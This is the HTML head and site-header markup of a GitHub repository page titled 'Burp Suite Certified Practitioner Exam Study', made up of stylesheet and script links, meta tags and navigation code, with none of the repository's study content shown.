






<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >




  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-8e973f836952.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light_high_contrast-34b642d57214.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-4bce7af39e21.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark_high_contrast-ad512d3e2f3b.css" /><link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-8e973f836952.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-34b642d57214.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-54be93e666a7.css" /><link data-color-theme="light_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind_high_contrast-8ae7edf5489c.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-84d50df427c0.css" /><link data-color-theme="light_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia_high_contrast-a80873375146.css" /><link data-color-theme="dark" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark-4bce7af39e21.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-ad512d3e2f3b.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-d152d6cd6879.css" /><link data-color-theme="dark_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind_high_contrast-fa4060c1a9da.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-d7bad0fb00bb.css" /><link data-color-theme="dark_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia_high_contrast-4a0107c0f60c.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-045e6b6ac094.css" /><link data-color-theme="dark_dimmed_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed_high_contrast-5de537db5e79.css" />

  <style type="text/css">
    :root {
      --tab-size-preference: 4;
    }

    pre, code {
      tab-size: var(--tab-size-preference);
    }
  </style>

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-c37d781e2da5.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-efa08b71f947.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-6dcb16809e76.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-f86c648606b5.css" />
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/repository-5d735668c600.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/code-9c9b8dc61e74.css" />

  

  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["a11y_status_checks_ruleset","actions_custom_images_public_preview_visibility","actions_custom_images_storage_billing_ui_visibility","actions_enable_snapshot_keyword","actions_image_version_event","alternate_user_config_repo","api_insights_show_missing_data_banner","arianotify_comprehensive_migration","arianotify_partial_migration","client_version_header","codespaces_prebuild_region_target_update","contentful_lp_footnotes","copilot_agent_cli_public_preview","copilot_agent_task_list_v2","copilot_agent_tasks_btn_code_nav","copilot_agent_tasks_btn_code_view","copilot_agent_tasks_btn_code_view_lines","copilot_agent_tasks_btn_repo","copilot_api_agentic_issue_marshal_yaml","copilot_api_draft_issue_reference_with_project_id","copilot_api_draft_issues_with_dependencies","copilot_api_github_draft_update_issue_skill","copilot_chat_agents_empty_state","copilot_chat_attach_multiple_images","copilot_chat_file_redirect","copilot_chat_input_commands","copilot_chat_opening_thread_switch","copilot_chat_reduce_quota_checks","copilot_chat_search_bar_redirect","copilot_chat_selection_attachments","copilot_chat_vision_in_claude","copilot_chat_vision_preview_gate","copilot_coding_agent_task_response","copilot_custom_copilots","copilot_custom_copilots_feature_preview","copilot_duplicate_thread","copilot_extensions_hide_in_dotcom_chat","copilot_extensions_removal_on_marketplace","copilot_features_raycast_logo","copilot_file_block_ref_matching","copilot_ftp_hyperspace_upgrade_prompt","copilot_immersive_generate_thread_name_async","copilot_immersive_issues_readonly_viewer","copilot_immersive_issues_show_relationships","copilot_immersive_job_result_preview","copilot_immersive_structured_model_picker","copilot_immersive_task_hyperlinking","copilot_immersive_task_within_chat_thread","copilot_org_policy_page_focus_mode","copilot_security_alert_assignee_options","copilot_share_active_subthread","copilot_spaces_as_attachments","copilot_spaces_code_view","copilot_spaces_ga","copilot_spaces_individual_policies_ga","copilot_spaces_public_access_to_user_owned_spaces","copilot_spaces_read_access_to_user_owned_spaces","copilot_spaces_report_abuse","copilot_spark_empty_state","copilot_spark_loading_webgl","copilot_spark_progressive_error_handling","copilot_spark_use_billing_headers","copilot_stable_conversation_view","copilot_swe_agent_progress_commands","copilot_swe_agent_use_subagents","copilot_workbench_agent_seed_tool","copilot_workbench_agent_user_edit_awareness","copilot_workbench_cache","copilot_workbench_preview_analytics","copilot_workbench_use_single_prompt","dashboard_universe_2025_feedback_dialog","data_router_force_refetch_on_navigation","direct_to_salesforce","disable_turbo_visit","dom_node_counts","dotcom_chat_client_side_skills","enterprise_ai_controls","failbot_report_error_react_apps_on_page","fetch_graphql_improved_error_serialization","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","global_search_multi_orgs","hyperspace_2025_logged_out_batch_1","hyperspace_nudges_universe25","hyperspace_nudges_universe25_post_event","initial_per_page_pagination_updates","issue_fields_report_usage","issues_expanded_file_types","issues_lazy_load_comment_box_suggestions","issues_react_bots_timeline_pagination","issues_react_prohibit_title_fallback","issues_report_sidebar_interactions","issues_sticky_sidebar","issues_title_flex_header_fix","item_picker_assignee_tsq_migration","item_picker_project_tsq_migration","kb_sunset","lifecycle_label_name_updates","link_contact_sales_swp_marketo","marketing_pages_search_explore_provider","mcp_registry_install","mcp_registry_oss_v0_1_api","memex_default_issue_create_repository","memex_grouped_by_edit_route","memex_mwl_filter_field_delimiter","mission_control_use_body_html","new_traffic_page_banner","open_agent_session_in_vscode_insiders","open_agent_session_in_vscode_stable","primer_react_segmented_control_tooltip","projects_assignee_max_limit","react_fetch_graphql_ignore_expected_errors","record_sso_banner_metrics","repos_insights_remove_new_url","ruleset_deletion_confirmation","sample_network_conn_type","scheduled_reminders_updated_limits","site_features_copilot_universe","site_homepage_collaborate_video","site_homepage_contentful","site_homepage_eyebrow_banner","site_homepage_universe_animations","site_msbuild_webgl_hero","spark_fix_rename","spark_force_push_after_checkout","spark_improve_image_upload","spark_kv_encocoded_keys","spark_show_data_access_on_publish","spark_sync_repository_after_iteration","spark_use_agent_status","viewscreen_sandbox","webp_support","wiki_a11y_compliant_sidebar","workbench_store_readonly"],"copilotApiOverrideUrl":"https://api.githubcopilot.com"}</script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/high-contrast-cookie-1a011967750c.js"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-9d0568c32bfb.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/913-ca2305638c53.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/6488-de87864e6818.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/environment-122ed792f7a3.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/11683-aa3d1ebe6648.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/43784-4652ae97a661.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/4712-809eac2badf7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/81028-5b8c5e07a4fa.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/74911-6a311b93ee8e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/91853-b5d2e5602241.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/78143-31968346cf4c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/52430-c46e2de36eb2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-5b3e77949adb.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-fa070ee9a768.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/28546-ee41c9313871.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/17688-a9e16fb5ed13.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/2869-a4ba8f17edb3.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/70191-5122bf27bf3e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/7332-5ea4ccf72018.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/3561-d56ebea34f95.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/19037-69d630e73af8.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/51519-b4d929bb1e46.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/67310-00ed42590310.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/96384-750ef5263abe.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/19718-676a65610616.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-c9e610c5aa64.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/48011-1f20a5c80dd7.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-eb21f5b0029d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/39713-8508e9483898.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/45688-b093405a7bf6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/90787-bf0d5c2b6350.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/codespaces-85b58bcf4cf6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/23387-1b12da426b92.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/72568-d9b14327a489.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/20065-de16f7379718.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/repositories-bd154f326d81.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/31615-236504c8966f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/code-menu-67717e88b7e6.js" defer="defer"></script>
  
  <script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-e4ebdadc89a4.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-760965ba27bb.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-core-021efa96a7a2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-a215e6ee021a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/12979-6037a19d779b.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/48775-3cc79d2cd30e.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/42892-341e79a04903.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/23832-db66abd83e08.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/62029-a6360a734229.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/25873-19b3275e0432.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/notifications-subscriptions-menu-28d0ba308e99.js" defer="defer"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/notifications-subscriptions-menu.933100a30c03fd4e8ae4.module.css" />

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/notifications-subscriptions-menu.933100a30c03fd4e8ae4.module.css" />


  <title>GitHub - botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study: Burp Suite Certified Practitioner Exam Study</title>



  <meta name="route-pattern" content="/:user_id/:repository" data-turbo-transient>
  <meta name="route-controller" content="files" data-turbo-transient>
  <meta name="route-action" content="disambiguate" data-turbo-transient>
  <meta name="fetch-nonce" content="v2:44c436e9-6f3f-c882-01d1-e5d4aec4503a">

    
  <meta name="current-catalog-service-hash" content="f3abb0cc802f3d7b95fc8762b94bdcb13bf39634c40c357301c4aa1d67a256fb">


  <meta name="request-id" content="D572:336FAD:14AF778:17AC925:692EC7AC" data-pjax-transient="true"/><meta name="html-safe-nonce" content="8599a408e78e58f7aed8d7cb34e751adb90928d213474d0dfd11c483983ef21c" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiJENTcyOjMzNkZBRDoxNEFGNzc4OjE3QUM5MjU6NjkyRUM3QUMiLCJ2aXNpdG9yX2lkIjoiMTY0MDExODIzNDA1MDg5NTg0IiwicmVnaW9uX2VkZ2UiOiJzb3V0aGVhc3Rhc2lhIiwicmVnaW9uX3JlbmRlciI6InNvdXRoZWFzdGFzaWEifQ==" data-pjax-transient="true"/><meta name="visitor-hmac" content="648a56a2092bee410686134f489e3e0892ce895fdb144ac6d0fe1bed459a278b" data-pjax-transient="true"/>


    <meta name="hovercard-subject-tag" content="repository:586233738" data-turbo-transient>


  <meta name="github-keyboard-shortcuts" content="repository,copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="repo_source" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="Burp Suite Certified Practitioner Exam Study. Contribute to botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study development by creating an account on GitHub.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">

    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com" />

      <meta name="twitter:image" content="https://opengraph.githubassets.com/afaef2e8017d112648f8eb583270745e28a6a9140a1fce074037d2f2c09cedc3/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="GitHub - botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study: Burp Suite Certified Practitioner Exam Study" /><meta name="twitter:description" content="Burp Suite Certified Practitioner Exam Study. Contribute to botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study development by creating an account on GitHub." />
  <meta property="og:image" content="https://opengraph.githubassets.com/afaef2e8017d112648f8eb583270745e28a6a9140a1fce074037d2f2c09cedc3/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" /><meta property="og:image:alt" content="Burp Suite Certified Practitioner Exam Study. Contribute to botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study development by creating an account on GitHub." /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="600" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="GitHub - botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study: Burp Suite Certified Practitioner Exam Study" /><meta property="og:url" content="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" /><meta property="og:description" content="Burp Suite Certified Practitioner Exam Study. Contribute to botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study development by creating an account on GitHub." />
  




      <meta name="hostname" content="github.com">



        <meta name="expected-hostname" content="github.com">


  <meta http-equiv="x-pjax-version" content="357a4441d707c1ea953912be6e542c3f6148977d595cf8cb8cd655f6e0be47c1" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="21a43568025709b66240454fc92d4f09335a96863f8ab1c46b4a07f6a5b67102" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="8487fec39c8c06b815832ce80ebd89387f6b3bac9b5498b820bc97b9a51ed30a" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="08855dea5a4040e62befe4bd21ac7e5567c3990d78acd9f443553027d4a4de57" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <meta data-hydrostats="publish">
  <meta name="go-import" content="github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study git https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git">

  <meta name="octolytics-dimension-user_id" content="52822072" /><meta name="octolytics-dimension-user_login" content="botesjuan" /><meta name="octolytics-dimension-repository_id" content="586233738" /><meta name="octolytics-dimension-repository_nwo" content="botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="586233738" /><meta name="octolytics-dimension-repository_network_root_nwo" content="botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" />



      <link rel="canonical" href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" data-turbo-transient>


    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">
  <meta name="disable-turbo" content="false">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="release" content="0ed90c40c35983bb3059d7977655dedf1dd14e12">
  <meta name="ui-target" content="canary-1">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />

  <meta name="msapplication-TileImage" content="/windows-tile.png">
  <meta name="msapplication-TileColor" content="#ffffff">

  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;" >
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;" >
      



    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.29aaeaafa90f007c6f61.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>





      

          

              
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/43862-5c4df3ba1119.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/85110-f7be2f54525a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/sessions-4659eb560eb4.js" defer="defer"></script>

<header class="HeaderMktg header-logged-out js-details-container js-header Details f4 py-3" role="banner" data-is-top="true" data-color-mode=light data-light-theme=light data-dark-theme=dark>
  <h2 class="sr-only">Navigation Menu</h2>

  <button type="button" class="HeaderMktg-backdrop d-lg-none border-0 position-fixed top-0 left-0 width-full height-full js-details-target" aria-label="Toggle navigation">
    <span class="d-none">Toggle navigation</span>
  </button>

  <div class="d-flex flex-column flex-lg-row flex-items-center px-3 px-md-4 px-lg-5 height-full position-relative z-1">
    <div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
      <div class="flex-1">
        <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="js-details-target js-nav-padding-recalculate js-header-menu-toggle Button--link Button--medium Button d-lg-none color-fg-inherit p-1">  <span class="Button-content">
    <span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
  </span>
</button>
      </div>

      <a class="mr-lg-3 color-fg-inherit flex-order-2 js-prevent-focus-on-mobile-nav"
        href="/"
        aria-label="Homepage"
        data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to go to homepage&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Logomark;ref_loc:Header&quot;}">
        <svg height="32" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
</svg>
      </a>

      <div class="d-flex flex-1 flex-order-2 text-right d-lg-none gap-2 flex-justify-end">
          <a
            href="/login?return_to=https%3A%2F%2Fgithub.com%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study%3Futm_source%3Dchatgpt.com"
            class="HeaderMenu-link HeaderMenu-button d-inline-flex f5 no-underline border color-border-default rounded-2 px-2 py-1 color-fg-inherit js-prevent-focus-on-mobile-nav"
            data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?utm_source=chatgpt.com&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a0e23657a72dba32dbf9a8e0064cf0a84bddadb13ababe9ee337abd6445edef8"
            data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to Sign in&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Sign in;ref_loc:Header&quot;}"
          >
            Sign in
          </a>
              <div class="AppHeader-appearanceSettings">
    <react-partial-anchor>
      <button data-target="react-partial-anchor.anchor" id="icon-button-a73a6bc5-4456-454a-a033-0949e755be9b" aria-labelledby="tooltip-baae4d1d-eb54-478b-b456-d59613853455" type="button" disabled="disabled" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium AppHeader-button HeaderMenu-link border cursor-wait">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-sliders Button-visual">
    <path d="M15 2.75a.75.75 0 0 1-.75.75h-4a.75.75 0 0 1 0-1.5h4a.75.75 0 0 1 .75.75Zm-8.5.75v1.25a.75.75 0 0 0 1.5 0v-4a.75.75 0 0 0-1.5 0V2H1.75a.75.75 0 0 0 0 1.5H6.5Zm1.25 5.25a.75.75 0 0 0 0-1.5h-6a.75.75 0 0 0 0 1.5h6ZM15 8a.75.75 0 0 1-.75.75H11.5V10a.75.75 0 1 1-1.5 0V6a.75.75 0 0 1 1.5 0v1.25h2.75A.75.75 0 0 1 15 8Zm-9 5.25v-2a.75.75 0 0 0-1.5 0v1.25H1.75a.75.75 0 0 0 0 1.5H4.5v1.25a.75.75 0 0 0 1.5 0v-2Zm9 0a.75.75 0 0 1-.75.75h-6a.75.75 0 0 1 0-1.5h6a.75.75 0 0 1 .75.75Z"></path>
</svg>
</button><tool-tip id="tooltip-baae4d1d-eb54-478b-b456-d59613853455" for="icon-button-a73a6bc5-4456-454a-a033-0949e755be9b" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Appearance settings</tool-tip>

      <template data-target="react-partial-anchor.template">
        <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/appearance-settings.753d458774a2f782559b.module.css" />

<react-partial
  partial-name="appearance-settings"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>


      </template>
    </react-partial-anchor>
  </div>

      </div>
    </div>


    <div class="HeaderMenu js-header-menu height-fit position-lg-relative d-lg-flex flex-column flex-auto top-0">
      <div class="HeaderMenu-wrapper d-flex flex-column flex-self-start flex-lg-row flex-auto rounded rounded-lg-0">
            <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/marketing-navigation.8284bdfe1ee4804a58c1.module.css" />

<react-partial
  partial-name="marketing-navigation"
  data-ssr="true"
  data-attempted-ssr="true"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"should_use_dotcom_links":true}}</script>
